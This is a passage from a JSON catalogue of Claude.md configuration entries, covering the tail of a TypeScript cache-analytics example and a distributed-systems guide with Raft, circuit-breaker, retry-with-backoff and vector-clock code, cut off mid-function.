averageLatency: number;\n    operationsPerSecond: number;\n    activeKeys: number;\n  } {\n    const lastMinute = Date.now() - 60000;\n    const recentOps = this.operations.filter(op => op.timestamp > lastMinute);\n    \n    const hits = recentOps.filter(op => op.hit).length;\n    const hitRate = recentOps.length > 0 ? (hits / recentOps.length) * 100 : 0;\n    \n    const totalLatency = recentOps.reduce((sum, op) => sum + op.latency, 0);\n    const averageLatency = recentOps.length > 0 ? totalLatency / recentOps.length : 0;\n    \n    const operationsPerSecond = recentOps.length / 60;\n    \n    const activeKeys = new Set(recentOps.map(op => op.key)).size;\n\n    return {\n      hitRate,\n      averageLatency,\n      operationsPerSecond,\n      activeKeys\n    };\n  }\n\n  // Export data for external analysis\n  exportData(format: 'json' | 'csv' = 'json'): string {\n    if (format === 'csv') {\n      const headers = ['timestamp', 'type', 'key', 'hit', 'latency', 'size', 'tier', 'userId', 'region'];\n      const rows = this.operations.map(op => [\n        op.timestamp,\n        op.type,\n        op.key,\n        op.hit,\n        op.latency,\n        op.size || '',\n        op.tier || '',\n        op.userId || '',\n        op.region || ''\n      ]);\n      \n      return [headers, ...rows].map(row => row.join(',')).join('\\n');\n    }\n    \n    return JSON.stringify(this.operations, null, 2);\n  }\n\n  // Clear old data to manage memory\n  cleanup(olderThan: number = 7 * 24 * 3600 * 1000): void { // 7 days default\n    const cutoff = Date.now() - olderThan;\n    this.operations = this.operations.filter(op => op.timestamp > cutoff);\n    \n    this.emit('cleanup:completed', {\n      operationsRemoved: this.operations.length,\n      cutoff\n    });\n  }\n}\n```\n\nThis comprehensive advanced caching configuration provides enterprise-grade caching capabilities including multi-tier caching, intelligent invalidation, distributed cache management, performance monitoring, and analytics for building high-performance applications at scale.",
      "tags": [
        {
          "tag": {
            "id": "caching",
            "name": "caching",
            "slug": "caching"
          }
        },
        {
          "tag": {
            "id": "redis",
            "name": "redis",
            "slug": "redis"
          }
        },
        {
          "tag": {
            "id": "memcached",
            "name": "memcached",
            "slug": "memcached"
          }
        },
        {
          "tag": {
            "id": "distributed-cache",
            "name": "distributed-cache",
            "slug": "distributed-cache"
          }
        },
        {
          "tag": {
            "id": "performance",
            "name": "performance",
            "slug": "performance"
          }
        },
        {
          "tag": {
            "id": "invalidation",
            "name": "invalidation",
            "slug": "invalidation"
          }
        },
        {
          "tag": {
            "id": "cdn",
            "name": "cdn",
            "slug": "cdn"
          }
        }
      ],
      "author": {
        "name": "Claude Code Community",
        "url": "https://github.com/claudecode-community"
      },
      "stats": {
        "votes": 21,
        "copies": 105
      },
      "_count": {
        "votes": 51,
        "copies": 173
      },
      "difficulty": "ADVANCED",
      "language": "TypeScript",
      "framework": "Redis + CDN + Application Cache",
      "createdAt": "2024-12-01",
      "lastUpdated": "2024-12-01",
      "featured": false
    },
    {
      "id": "distributed-systems-design",
      "title": "Distributed Systems Design + Fault Tolerance",
      "slug": "distributed-systems-design-consistency-fault-tolerance",
      "tagline": "Distributed Systems Patterns configuration for advanced developers",
      "description": "Advanced distributed systems architecture with consistency patterns, fault tolerance mechanisms, consensus algorithms, and scalability design principles for building resilient systems at scale.",
      "categoryId": "claude-configs",
      "category": {
        "id": "claude-configs",
        "name": "Claude.md Configurations",
        "slug": "claude-configs",
        "description": "Ready-to-use Claude.md configuration files for different tech stacks and project types, including advanced enterprise-grade configurations.",
        "icon": "📋",
        "color": "#F59E0B"
      },
      "type": "CONFIGURATION",
      "content": "# Claude.md - Distributed Systems Design + Fault Tolerance\n\n## Project Overview\n\nThis is an advanced distributed systems design guide focused on building resilient, scalable, and consistent distributed applications. It covers fundamental distributed systems challenges, consistency patterns, fault tolerance mechanisms, consensus algorithms, and practical implementation patterns for designing systems that can handle failures gracefully while maintaining correctness and availability.\n\n## Distributed Systems Philosophy\n\n### Core Principles\n1. **Assume Failure**: Every component will eventually fail\n2. **Design for Partitions**: Network partitions are inevitable\n3. **Embrace Asynchrony**: Synchronous communication doesn't scale\n4. **Idempotency**: Operations should be safely retryable\n5. **Observability**: System behavior must be measurable\n6. **Graceful Degradation**: Fail gracefully with reduced functionality\n\n### Fundamental Challenges\n- **Partial Failures**: Some nodes fail while others continue\n- **Network Partitions**: Nodes become unreachable\n- **Timing Issues**: Clocks drift, messages are delayed\n- **Concurrent Updates**: Multiple nodes modify shared state\n- **Data Consistency**: Maintaining correctness across replicas\n- **Distributed Coordination**: Achieving consensus on actions\n\n### CAP Theorem Trade-offs\n- **Consistency (C)**: All nodes see the same data simultaneously\n- **Availability (A)**: System remains operational\n- **Partition Tolerance (P)**: System continues despite network failures\n\n## Technology Stack\n\n- **Service Discovery**: Consul, etcd, ZooKeeper\n- **Load Balancers**: HAProxy, NGINX, Envoy\n- **Message Queues**: Apache Kafka, RabbitMQ, NATS\n- **Consensus Systems**: Raft, PBFT, etcd\n- **Databases**: Cassandra, MongoDB, CockroachDB\n- **Caching**: Redis Cluster, Hazelcast\n- **Monitoring**: Prometheus, Grafana, Jaeger\n- **Orchestration**: Kubernetes, Docker Swarm\n\n## Architecture Overview\n\n```\nDistributed System Architecture\n\n                    ┌─────────────────┐\n                    │   Load Balancer │\n                    │   (HAProxy)     │\n                    └─────────┬───────┘\n                              │\n        ┌─────────────────────┼─────────────────────┐\n        │                     │                     │\n    ┌───▼───┐             ┌───▼───┐             ┌───▼───┐\n    │Service│             │Service│             │Service│\n    │ Node 1│             │ Node 2│             │ Node 3│\n    └───┬───┘             └───┬───┘             └───┬───┘\n        │                     │                     │\n        └─────────────┬───────┴─────────┬─────────────┘\n                      │                 │\n              ┌───────▼───────┐ ┌───────▼───────┐\n              │  Message Bus  │ │ Service Mesh  │\n              │   (Kafka)     │ │   (Istio)     │\n              └───────┬───────┘ └───────┬───────┘\n                      │                 │\n        ┌─────────────┼─────────────────┼─────────────┐\n        │             │                 │             │\n    ┌───▼───┐     ┌───▼───┐         ┌───▼───┐     ┌───▼───┐\n    │  DB   │     │  DB   │         │ Cache │     │ Cache │\n    │Primary│     │Replica│         │Node 1 │     │Node 2 │\n    └───────┘     └───────┘         └───────┘     └───────┘\n```\n\n## Project Structure\n\n```\ndistributed-systems-design/\n├── src/\n│   ├── consensus/                  # Consensus algorithm implementations\n│   │   ├── raft/                   # Raft consensus implementation\n│   │   │   ├── RaftNode.ts         # Raft node implementation\n│   │   │   ├── LogEntry.ts         # Log entry structure\n│   │   │   ├── StateMachine.ts     # Replicated state machine\n│   │   │   └── RaftConsensus.ts    # Raft consensus protocol\n│   │   ├── pbft/                   # PBFT implementation\n│   │   └── common/                 # Common consensus interfaces\n│   ├── consistency/                # Consistency patterns\n│   │   ├── eventual/               # Eventual consistency\n│   │   │   ├── CRDTs.ts           # Conflict-free replicated data types\n│   │   │   ├── VectorClock.ts     # Vector clock implementation\n│   │   │   └── AntiEntropy.ts     # Anti-entropy protocols\n│   │   ├── strong/                 # Strong consistency\n│   │   │   ├── TwoPhaseCommit.ts  # 2PC protocol\n│   │   │   ├── ThreePhaseCommit.ts # 3PC protocol\n│   │   │   └── Paxos.ts           # Paxos consensus\n│   │   └── causal/                 # Causal consistency\n│   │       ├── CausalBroadcast.ts # Causal broadcast\n│   │       └── HappensBefore.ts   # Happens-before relationships\n│   ├── fault-tolerance/            # Fault tolerance mechanisms\n│   │   ├── circuit-breaker/        # Circuit breaker pattern\n│   │   │   ├── CircuitBreaker.ts   # Circuit breaker implementation\n│   │   │   ├── CircuitState.ts     # Circuit state management\n│   │   │   └── FailureDetector.ts  # Failure detection\n│   │   ├── bulkhead/              # Bulkhead pattern\n│   │   ├── timeout/               # Timeout patterns\n│   │   ├── retry/                 # Retry mechanisms\n│   │   │   ├── ExponentialBackoff.ts\n│   │   │   ├── JitteredRetry.ts\n│   │   │   └── RetryPolicy.ts\n│   │   └── graceful-degradation/  # Graceful degradation\n│   ├── replication/               # Data replication strategies\n│   │   ├── master-slave/          # Master-slave replication\n│   │   ├── master-master/         # Master-master replication\n│   │   ├── chain-replication/     # Chain replication\n│   │   └── quorum/               # Quorum-based replication\n│   │       ├── QuorumConsensus.ts # Quorum consensus\n│   │       └── ReadWriteQuorum.ts # R/W quorum\n│   ├── partitioning/              # Data partitioning strategies\n│   │   ├── horizontal/            # Horizontal partitioning (sharding)\n│   │   │   ├── ConsistentHashing.ts\n│   │   │   ├── RangePartitioning.ts\n│   │   │   └── HashPartitioning.ts\n│   │   ├── vertical/              # Vertical partitioning\n│   │   └── functional/            # Functional partitioning\n│   ├── coordination/              # Distributed coordination\n│   │   ├── leader-election/       # Leader election algorithms\n│   │   │   ├── BullyAlgorithm.ts  # Bully algorithm\n│   │   │   ├── RingAlgorithm.ts   # Ring-based election\n│   │   │   └── RaftElection.ts    # Raft leader election\n│   │   ├── distributed-locking/   # Distributed locks\n│   │   │   ├── RedisLock.ts       # Redis-based locks\n│   │   │   ├── ZooKeeperLock.ts   # ZooKeeper locks\n│   │   │   └── EtcdLock.ts        # etcd locks\n│   │   └── barriers/              # Synchronization barriers\n│   ├── load-balancing/            # Load balancing strategies\n│   │   ├── round-robin/           # Round-robin balancing\n│   │   ├── weighted-round-robin/  # Weighted round-robin\n│   │   ├── least-connections/     # Least connections\n│   │   ├── consistent-hashing/    # Consistent hashing LB\n│   │   └── health-check/          # Health checking\n│   ├── caching/                   # Distributed caching\n│   │   ├── cache-coherence/       # Cache coherence protocols\n│   │   ├── cache-invalidation/    # Cache invalidation strategies\n│   │   └── distributed-cache/     # Distributed cache implementation\n│   └── monitoring/                # System monitoring and observability\n│       ├── metrics/               # Metrics collection\n│       ├── tracing/               # Distributed tracing\n│       ├── logging/               # Distributed logging\n│       └── health-checks/         # Health monitoring\n├── examples/                      # Implementation examples\n│   ├── chat-system/               # Distributed chat system\n│   ├── key-value-store/           # Distributed KV store\n│   ├── task-queue/                # Distributed task queue\n│   └── file-system/               # Distributed file system\n├── benchmarks/                    # Performance benchmarks\n├── tests/                         # Test suites\n│   ├── unit/                      # Unit tests\n│   ├── integration/               # Integration tests\n│   ├── chaos/                     # Chaos engineering tests\n│   └── performance/               # Performance tests\n└── docs/                          # Documentation\n    ├── consistency-models.md       # Consistency model explanations\n    ├── consensus-algorithms.md     # Consensus algorithm details\n    ├── fault-tolerance-patterns.md # Fault tolerance patterns\n    └── scalability-patterns.md    # Scalability design patterns\n```\n\n## Consensus Algorithms\n\n### Raft Consensus Implementation\n```typescript\n// src/consensus/raft/RaftNode.ts\nimport { EventEmitter } from 'events';\n\nexport enum RaftState {\n  FOLLOWER = 'FOLLOWER',\n  CANDIDATE = 'CANDIDATE',\n  LEADER = 'LEADER'\n}\n\nexport interface LogEntry {\n  term: number;\n  index: number;\n  command: any;\n  timestamp: number;\n}\n\nexport interface RaftMessage {\n  type: 'RequestVote' | 'RequestVoteResponse' | 'AppendEntries' | 'AppendEntriesResponse';\n  term: number;\n  from: string;\n  to: string;\n  data: any;\n}\n\nexport class RaftNode extends EventEmitter {\n  private nodeId: string;\n  private state: RaftState = RaftState.FOLLOWER;\n  private currentTerm: number = 0;\n  private votedFor: string | null = null;\n  private log: LogEntry[] = [];\n  private commitIndex: number = 0;\n  private lastApplied: number = 0;\n  \n  // Leader-specific state\n  private nextIndex: Map<string, number> = new Map();\n  private matchIndex: Map<string, number> = new Map();\n  \n  // Timers\n  private electionTimer: NodeJS.Timeout | null = null;\n  private heartbeatTimer: NodeJS.Timeout | null = null;\n  \n  // Configuration\n  private peers: string[] = [];\n  private electionTimeoutMs: number = 150 + Math.random() * 150; // 150-300ms\n  private heartbeatIntervalMs: number = 50; // 50ms\n\n  constructor(nodeId: string, peers: string[]) {\n    super();\n    this.nodeId = nodeId;\n    this.peers = peers.filter(p => p !== nodeId);\n    this.resetElectionTimer();\n  }\n\n  public start(): void {\n    console.log(`Raft node ${this.nodeId} starting...`);\n    this.becomeFollower(0);\n  }\n\n  public stop(): void {\n    this.clearTimers();\n    console.log(`Raft node ${this.nodeId} stopped`);\n  }\n\n  public appendCommand(command: any): Promise<boolean> {\n    return new Promise((resolve, reject) => {\n      if (this.state !== RaftState.LEADER) {\n        reject(new Error('Not leader'));\n        return;\n      }\n\n      const entry: LogEntry = {\n        term: this.currentTerm,\n        index: this.log.length + 1,\n        command,\n        timestamp: Date.now()\n      };\n\n      this.log.push(entry);\n      \n      // Immediately try to replicate to majority\n      this.replicateToMajority(entry)\n        .then(success => resolve(success))\n        .catch(error => reject(error));\n    });\n  }\n\n  public handleMessage(message: RaftMessage): void {\n    // Update term if we receive a higher term\n    if (message.term > this.currentTerm) {\n      this.currentTerm = message.term;\n      this.votedFor = null;\n      this.becomeFollower(message.term);\n    }\n\n    switch (message.type) {\n      case 'RequestVote':\n        this.handleRequestVote(message);\n        break;\n      case 'RequestVoteResponse':\n        this.handleRequestVoteResponse(message);\n        break;\n      case 'AppendEntries':\n        this.handleAppendEntries(message);\n        break;\n      case 'AppendEntriesResponse':\n        this.handleAppendEntriesResponse(message);\n        break;\n    }\n  }\n\n  private becomeFollower(term: number): void {\n    console.log(`Node ${this.nodeId} becoming follower for term ${term}`);\n    this.state = RaftState.FOLLOWER;\n    this.currentTerm = term;\n    this.votedFor = null;\n    this.clearHeartbeatTimer();\n    this.resetElectionTimer();\n  }\n\n  private becomeCandidate(): void {\n    console.log(`Node ${this.nodeId} becoming candidate for term ${this.currentTerm + 1}`);\n    this.state = RaftState.CANDIDATE;\n    this.currentTerm++;\n    this.votedFor = this.nodeId;\n    this.resetElectionTimer();\n    \n    // Start election\n    this.startElection();\n  }\n\n  private becomeLeader(): void {\n    console.log(`Node ${this.nodeId} becoming leader for term ${this.currentTerm}`);\n    this.state = RaftState.LEADER;\n    this.clearElectionTimer();\n    \n    // Initialize leader state\n    this.peers.forEach(peer => {\n      this.nextIndex.set(peer, this.log.length + 1);\n      this.matchIndex.set(peer, 0);\n    });\n    \n    // Start sending heartbeats\n    this.startHeartbeats();\n  }\n\n  private startElection(): void {\n    let votesReceived = 1; // Vote for self\n    const votesNeeded = Math.floor((this.peers.length + 1) / 2) + 1;\n\n    this.peers.forEach(peer => {\n      const lastLogIndex = this.log.length;\n      const lastLogTerm = lastLogIndex > 0 ? this.log[lastLogIndex - 1].term : 0;\n\n      const requestVote: RaftMessage = {\n        type: 'RequestVote',\n        term: this.currentTerm,\n        from: this.nodeId,\n        to: peer,\n        data: {\n          candidateId: this.nodeId,\n          lastLogIndex,\n          lastLogTerm\n        }\n      };\n\n      this.sendMessage(requestVote);\n    });\n  }\n\n  private handleRequestVote(message: RaftMessage): void {\n    const { candidateId, lastLogIndex, lastLogTerm } = message.data;\n    let voteGranted = false;\n\n    // Check if we can vote for this candidate\n    if (message.term >= this.currentTerm && \n        (this.votedFor === null || this.votedFor === candidateId)) {\n      \n      // Check if candidate's log is at least as up-to-date as ours\n      const ourLastLogIndex = this.log.length;\n      const ourLastLogTerm = ourLastLogIndex > 0 ? this.log[ourLastLogIndex - 1].term : 0;\n\n      if (lastLogTerm > ourLastLogTerm || \n          (lastLogTerm === ourLastLogTerm && lastLogIndex >= ourLastLogIndex)) {\n        voteGranted = true;\n        this.votedFor = candidateId;\n        this.resetElectionTimer();\n      }\n    }\n\n    const response: RaftMessage = {\n      type: 'RequestVoteResponse',\n      term: this.currentTerm,\n      from: this.nodeId,\n      to: message.from,\n      data: { voteGranted }\n    };\n\n    this.sendMessage(response);\n  }\n\n  private handleRequestVoteResponse(message: RaftMessage): void {\n    if (this.state !== RaftState.CANDIDATE || message.term !== this.currentTerm) {\n      return;\n    }\n\n    if (message.data.voteGranted) {\n      // Count votes (including our own)\n      let votes = 1;\n      // In a real implementation, you'd track votes from all peers\n      const votesNeeded = Math.floor((this.peers.length + 1) / 2) + 1;\n      \n      if (votes >= votesNeeded) {\n        this.becomeLeader();\n      }\n    }\n  }\n\n  private startHeartbeats(): void {\n    this.heartbeatTimer = setInterval(() => {\n      this.sendHeartbeats();\n    }, this.heartbeatIntervalMs);\n    \n    // Send immediate heartbeat\n    this.sendHeartbeats();\n  }\n\n  private sendHeartbeats(): void {\n    this.peers.forEach(peer => {\n      const prevLogIndex = (this.nextIndex.get(peer) || 1) - 1;\n      const prevLogTerm = prevLogIndex > 0 ? this.log[prevLogIndex - 1].term : 0;\n      \n      const appendEntries: RaftMessage = {\n        type: 'AppendEntries',\n        term: this.currentTerm,\n        from: this.nodeId,\n        to: peer,\n        data: {\n          leaderId: this.nodeId,\n          prevLogIndex,\n          prevLogTerm,\n          entries: [], // Heartbeat - no entries\n          leaderCommit: this.commitIndex\n        }\n      };\n\n      this.sendMessage(appendEntries);\n    });\n  }\n\n  private async replicateToMajority(entry: LogEntry): Promise<boolean> {\n    // Simplified implementation - in reality, this would track responses\n    // and commit when majority acknowledges\n    return new Promise((resolve) => {\n      setTimeout(() => {\n        this.commitIndex = entry.index;\n        resolve(true);\n      }, 10); // Simulate network delay\n    });\n  }\n\n  private handleAppendEntries(message: RaftMessage): void {\n    const { leaderId, prevLogIndex, prevLogTerm, entries, leaderCommit } = message.data;\n    \n    this.resetElectionTimer(); // Reset election timer on valid heartbeat\n    \n    let success = false;\n    \n    // Check if our log contains an entry at prevLogIndex with matching term\n    if (prevLogIndex === 0 || \n        (prevLogIndex <= this.log.length && \n         this.log[prevLogIndex - 1].term === prevLogTerm)) {\n      \n      success = true;\n      \n      // Append new entries\n      if (entries.length > 0) {\n        // Remove conflicting entries and append new ones\n        this.log = this.log.slice(0, prevLogIndex);\n        this.log.push(...entries);\n      }\n      \n      // Update commit index\n      if (leaderCommit > this.commitIndex) {\n        this.commitIndex = Math.min(leaderCommit, this.log.length);\n      }\n    }\n\n    const response: RaftMessage = {\n      type: 'AppendEntriesResponse',\n      term: this.currentTerm,\n      from: this.nodeId,\n      to: message.from,\n      data: { \n        success,\n        matchIndex: success ? prevLogIndex + entries.length : 0\n      }\n    };\n\n    this.sendMessage(response);\n  }\n\n  private handleAppendEntriesResponse(message: RaftMessage): void {\n    if (this.state !== RaftState.LEADER || message.term !== this.currentTerm) {\n      return;\n    }\n\n    const peer = message.from;\n    const { success, matchIndex } = message.data;\n\n    if (success) {\n      this.matchIndex.set(peer, matchIndex);\n      this.nextIndex.set(peer, matchIndex + 1);\n    } else {\n      // Decrement nextIndex and retry\n      const currentNext = this.nextIndex.get(peer) || 1;\n      this.nextIndex.set(peer, Math.max(1, currentNext - 1));\n    }\n  }\n\n  private sendMessage(message: RaftMessage): void {\n    // In a real implementation, this would send over network\n    this.emit('message', message);\n  }\n\n  private resetElectionTimer(): void {\n    this.clearElectionTimer();\n    this.electionTimer = setTimeout(() => {\n      if (this.state !== RaftState.LEADER) {\n        this.becomeCandidate();\n      }\n    }, this.electionTimeoutMs);\n  }\n\n  private clearElectionTimer(): void {\n    if (this.electionTimer) {\n      clearTimeout(this.electionTimer);\n      this.electionTimer = null;\n    }\n  }\n\n  private clearHeartbeatTimer(): void {\n    if (this.heartbeatTimer) {\n      clearInterval(this.heartbeatTimer);\n      this.heartbeatTimer = null;\n    }\n  }\n\n  private clearTimers(): void {\n    this.clearElectionTimer();\n    this.clearHeartbeatTimer();\n  }\n\n  // Getters for testing and monitoring\n  get currentState(): RaftState { return this.state; }\n  get term(): number { return this.currentTerm; }\n  get logLength(): number { return this.log.length; }\n  get committed(): number { return this.commitIndex; }\n}\n```\n\n## Fault Tolerance Patterns\n\n### Circuit Breaker Implementation\n```typescript\n// src/fault-tolerance/circuit-breaker/CircuitBreaker.ts\nexport enum CircuitState {\n  CLOSED = 'CLOSED',\n  OPEN = 'OPEN',\n  HALF_OPEN = 'HALF_OPEN'\n}\n\nexport interface CircuitBreakerConfig {\n  failureThreshold: number;      // Number of failures to open circuit\n  recoveryTimeout: number;       // Time before attempting recovery (ms)\n  monitoringWindow: number;      // Time window for failure monitoring (ms)\n  expectedErrors: string[];      // Error types that should trigger circuit\n  volumeThreshold: number;       // Minimum calls before circuit can open\n}\n\nexport interface CircuitBreakerMetrics {\n  totalCalls: number;\n  successfulCalls: number;\n  failedCalls: number;\n  rejectedCalls: number;\n  averageResponseTime: number;\n  lastFailureTime?: number;\n}\n\nexport class CircuitBreaker<T = any> {\n  private state: CircuitState = CircuitState.CLOSED;\n  private failureCount: number = 0;\n  private lastFailureTime: number = 0;\n  private nextAttemptTime: number = 0;\n  private callHistory: { timestamp: number; success: boolean; duration: number }[] = [];\n  \n  constructor(\n    private config: CircuitBreakerConfig,\n    private name: string = 'CircuitBreaker'\n  ) {}\n\n  async execute<R>(operation: () => Promise<R>): Promise<R> {\n    const canExecute = this.canExecute();\n    \n    if (!canExecute) {\n      this.recordRejection();\n      throw new Error(`Circuit breaker '${this.name}' is OPEN`);\n    }\n\n    const startTime = Date.now();\n    \n    try {\n      const result = await operation();\n      this.recordSuccess(Date.now() - startTime);\n      return result;\n    } catch (error) {\n      this.recordFailure(Date.now() - startTime);\n      throw error;\n    }\n  }\n\n  private canExecute(): boolean {\n    const now = Date.now();\n    \n    switch (this.state) {\n      case CircuitState.CLOSED:\n        return true;\n        \n      case CircuitState.OPEN:\n        if (now >= this.nextAttemptTime) {\n          this.transitionToHalfOpen();\n          return true;\n        }\n        return false;\n        \n      case CircuitState.HALF_OPEN:\n        return true;\n        \n      default:\n        return false;\n    }\n  }\n\n  private recordSuccess(duration: number): void {\n    this.addCallToHistory(true, duration);\n    this.failureCount = 0;\n    \n    if (this.state === CircuitState.HALF_OPEN) {\n      this.transitionToClosed();\n    }\n  }\n\n  private recordFailure(duration: number): void {\n    this.addCallToHistory(false, duration);\n    this.failureCount++;\n    this.lastFailureTime = Date.now();\n    \n    if (this.state === CircuitState.HALF_OPEN) {\n      this.transitionToOpen();\n    } else if (this.state === CircuitState.CLOSED && this.shouldOpenCircuit()) {\n      this.transitionToOpen();\n    }\n  }\n\n  private recordRejection(): void {\n    // Rejections don't count as failures, but we track them for metrics\n  }\n\n  private shouldOpenCircuit(): boolean {\n    const recentCalls = this.getRecentCalls();\n    \n    // Need minimum volume of calls\n    if (recentCalls.length < this.config.volumeThreshold) {\n      return false;\n    }\n    \n    const failedCalls = recentCalls.filter(call => !call.success).length;\n    const failureRate = failedCalls / recentCalls.length;\n    \n    return failureRate >= (this.config.failureThreshold / 100);\n  }\n\n  private getRecentCalls(): { timestamp: number; success: boolean; duration: number }[] {\n    const cutoff = Date.now() - this.config.monitoringWindow;\n    return this.callHistory.filter(call => call.timestamp >= cutoff);\n  }\n\n  private addCallToHistory(success: boolean, duration: number): void {\n    const now = Date.now();\n    this.callHistory.push({ timestamp: now, success, duration });\n    \n    // Clean up old entries\n    const cutoff = now - this.config.monitoringWindow;\n    this.callHistory = this.callHistory.filter(call => call.timestamp >= cutoff);\n  }\n\n  private transitionToClosed(): void {\n    console.log(`Circuit breaker '${this.name}' transitioning to CLOSED`);\n    this.state = CircuitState.CLOSED;\n    this.failureCount = 0;\n  }\n\n  private transitionToOpen(): void {\n    console.log(`Circuit breaker '${this.name}' transitioning to OPEN`);\n    this.state = CircuitState.OPEN;\n    this.nextAttemptTime = Date.now() + this.config.recoveryTimeout;\n  }\n\n  private transitionToHalfOpen(): void {\n    console.log(`Circuit breaker '${this.name}' transitioning to HALF_OPEN`);\n    this.state = CircuitState.HALF_OPEN;\n  }\n\n  getMetrics(): CircuitBreakerMetrics {\n    const recentCalls = this.getRecentCalls();\n    const successfulCalls = recentCalls.filter(call => call.success).length;\n    const failedCalls = recentCalls.filter(call => !call.success).length;\n    const totalDuration = recentCalls.reduce((sum, call) => sum + call.duration, 0);\n    \n    return {\n      totalCalls: recentCalls.length,\n      successfulCalls,\n      failedCalls,\n      rejectedCalls: 0, // Would need separate tracking\n      averageResponseTime: recentCalls.length > 0 ? totalDuration / recentCalls.length : 0,\n      lastFailureTime: this.lastFailureTime > 0 ? this.lastFailureTime : undefined\n    };\n  }\n\n  getState(): CircuitState {\n    return this.state;\n  }\n\n  reset(): void {\n    this.state = CircuitState.CLOSED;\n    this.failureCount = 0;\n    this.lastFailureTime = 0;\n    this.nextAttemptTime = 0;\n    this.callHistory = [];\n  }\n}\n```\n\n### Retry Mechanism with Exponential Backoff\n```typescript\n// src/fault-tolerance/retry/ExponentialBackoff.ts\nexport interface RetryConfig {\n  maxAttempts: number;\n  baseDelayMs: number;\n  maxDelayMs: number;\n  backoffMultiplier: number;\n  jitter: boolean;\n  retryableErrors: string[];\n}\n\nexport interface RetryResult<T> {\n  result?: T;\n  error?: Error;\n  attempts: number;\n  totalDuration: number;\n}\n\nexport class ExponentialBackoffRetry {\n  constructor(private config: RetryConfig) {}\n\n  async execute<T>(operation: () => Promise<T>): Promise<T> {\n    let lastError: Error;\n    let attempt = 0;\n    const startTime = Date.now();\n\n    while (attempt < this.config.maxAttempts) {\n      attempt++;\n      \n      try {\n        const result = await operation();\n        console.log(`Operation succeeded on attempt ${attempt}`);\n        return result;\n      } catch (error) {\n        lastError = error as Error;\n        \n        if (!this.isRetryableError(error as Error)) {\n          console.log(`Non-retryable error: ${error.message}`);\n          throw error;\n        }\n        \n        if (attempt === this.config.maxAttempts) {\n          console.log(`Max attempts (${this.config.maxAttempts}) reached`);\n          break;\n        }\n        \n        const delay = this.calculateDelay(attempt);\n        console.log(`Attempt ${attempt} failed, retrying in ${delay}ms: ${error.message}`);\n        \n        await this.sleep(delay);\n      }\n    }\n\n    throw new Error(`Operation failed after ${attempt} attempts. Last error: ${lastError.message}`);\n  }\n\n  private isRetryableError(error: Error): boolean {\n    if (this.config.retryableErrors.length === 0) {\n      return true; // Retry all errors if none specified\n    }\n    \n    return this.config.retryableErrors.some(errorType => \n      error.name === errorType || error.message.includes(errorType)\n    );\n  }\n\n  private calculateDelay(attempt: number): number {\n    const baseDelay = this.config.baseDelayMs * Math.pow(this.config.backoffMultiplier, attempt - 1);\n    const cappedDelay = Math.min(baseDelay, this.config.maxDelayMs);\n    \n    if (this.config.jitter) {\n      // Add random jitter (±25%)\n      const jitterRange = cappedDelay * 0.25;\n      const jitter = (Math.random() - 0.5) * 2 * jitterRange;\n      return Math.max(0, cappedDelay + jitter);\n    }\n    \n    return cappedDelay;\n  }\n\n  private sleep(ms: number): Promise<void> {\n    return new Promise(resolve => setTimeout(resolve, ms));\n  }\n}\n\n// Usage example with different retry strategies\nexport class RetryStrategies {\n  static readonly IMMEDIATE = new ExponentialBackoffRetry({\n    maxAttempts: 3,\n    baseDelayMs: 0,\n    maxDelayMs: 0,\n    backoffMultiplier: 1,\n    jitter: false,\n    retryableErrors: []\n  });\n\n  static readonly FAST = new ExponentialBackoffRetry({\n    maxAttempts: 3,\n    baseDelayMs: 100,\n    maxDelayMs: 1000,\n    backoffMultiplier: 2,\n    jitter: true,\n    retryableErrors: ['NetworkError', 'TimeoutError']\n  });\n\n  static readonly STANDARD = new ExponentialBackoffRetry({\n    maxAttempts: 5,\n    baseDelayMs: 1000,\n    maxDelayMs: 30000,\n    backoffMultiplier: 2,\n    jitter: true,\n    retryableErrors: ['NetworkError', 'TimeoutError', 'ServiceUnavailable']\n  });\n\n  static readonly PERSISTENT = new ExponentialBackoffRetry({\n    maxAttempts: 10,\n    baseDelayMs: 1000,\n    maxDelayMs: 60000,\n    backoffMultiplier: 1.5,\n    jitter: true,\n    retryableErrors: []\n  });\n}\n```\n\n## Consistency Patterns\n\n### Vector Clock Implementation\n```typescript\n// src/consistency/eventual/VectorClock.ts\nexport class VectorClock {\n  private clock: Map<string, number> = new Map();\n\n  constructor(nodeId?: string, initialClock?: Map<string, number>) {\n    if (initialClock) {\n      this.clock = new Map(initialClock);\n    }\n    if (nodeId) {\n      this.clock.set(nodeId, this.clock.get(nodeId) || 0);\n    }\n  }\n\n  // Increment the clock for a specific node\n  increment(nodeId: string): VectorClock {\n    const newClock = new Map(this.clock);\n    newClock.set(nodeId, (newClock.get(nodeId) || 0) + 1);\n    return new VectorClock(undefined, newClock);\n  }\n\n  // Update clock based on received message\n  update(otherClock: VectorClock, nodeId: string): VectorClock {\n    const newClock = new Map();\n    \n    // Get all node IDs from both clocks\n    const allNodes = new Set([...this.clock.keys(), ...otherClock.clock.keys()]);\n    \n    // For each node, take the maximum timestamp\n    allNodes.forEach(node => {\n      const myTime = this.clock.get(node) || 0;\n      const otherTime = otherClock.clock.get(node) || 0;\n      newClock.set(node, Math.max(myTime, otherTime));\n    });\n    \n    // Increment our own clock\n    newClock.set(nodeId, (newClock.get(nodeId) || 0) + 1);\n    \n    return new VectorClock(undefined, newClock);\n  }\n\n  // Compare two vector clocks\n  compareTo(other: VectorClock): 'before' | 'after' | 'concurrent' | 'equal' {\n    const allNodes = new Set([...this.clock.keys(), ...other.clock.keys()]);\n    \n    let thisLess = false;\n    let thisGreater = false;\n    \n    for (const node of allNodes) {\n      const thisTime = this.clock.get(node) || 0;\n      const otherTime = other.clock.get(node) || 0;\n      \n      if (thisTime < otherTime) {\n        thisLess = true;\n      } else if (thisTime > otherTime) {\n        thisGreater = true;\n      }\n    }\n    \n    if (thisLess && !thisGreater) {\n      return 'before';\n    } else if (!thisLess && thisGreater) {\n      return 'after';\n    } else if (!thisLess && !thisGreater) {\n      return 'equal';\n    } else {\n      return 'concurrent';\n    }\n  }\n\n  // Check if this clock happens before another\n  happensBefore(other: VectorClock): boolean {\n    return this.compareTo(other) === 'before';\n  }\n\n  // Check if events are concurrent\n  isConcurrentWith(other: VectorClock): boolean {\n    return this.compareTo(other) === 'concurrent';\n  }\n\n  // Get timestamp for a specific node\n  getTime(nodeId: string): number {\n    return this.clock.get(nodeId) || 0;\n  }\n\n  // Get all nodes in the clock\n  getNodes(): string[] {\n    return Array.from(this.clock.keys());\n  }\n\n  // Create a copy of the clock\n  copy(): VectorClock {\n    return new VectorClock(undefined, new Map(this.clock));\n  }\n\n  // Serialize to JSON\n  toJSON(): Record<string, number> {\n    const obj: Record<string, number> = {};\n    